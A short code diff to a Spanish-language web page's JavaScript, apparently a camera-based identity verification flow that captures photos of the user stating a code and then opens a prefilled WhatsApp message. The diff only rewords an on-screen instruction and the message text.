@@ -273,7 +273,7 @@
                                     
                                     // --- PASO 5: Captura final (con el código) ---
                                     setTimeout(() => {
-                                        challenge.innerHTML = `5. Mira al CENTRO:<br><strong style="color:red; font-size:1.5em;">"Mi código es ${codigoSecreto}"</strong>`;
+                                        challenge.innerHTML = `5. Mira al Centro:<br><strong style="color:red; font-size:1.5em;">"Mi código es ${codigoSecreto}"</strong>`;
                                         capturarFoto(); // Foto 7
                                         
                                         setTimeout(() => {
@@ -402,7 +402,7 @@
                 if (file) {
                     const reader = new FileReader();
                     reader.onload = (e) => {
-                        const mensaje = `🔒 VERIFICACIÓN MASTERCHL%0A%0A👤 Usuario: ${token}%0A%0A✅ Código verificado: ${codigoSecreto}%0A%0A✅ Verificación en proceso. Confirmo que soy real.`;
+                        const mensaje = `🔒 ENVIAME LA IMAGEN QUE SE DESCARGO%0A%0A👤 Usuario: ${token}%0A%0A✅ Código verificado: ${codigoSecreto}%0A%0A✅ Verifica que soy real y no un estafador ni revendedor.`;
                         const url = `https://wa.me/${MY_WHATSAPP}?text=${mensaje}`;
                         
                         window.open(url, '_blank');
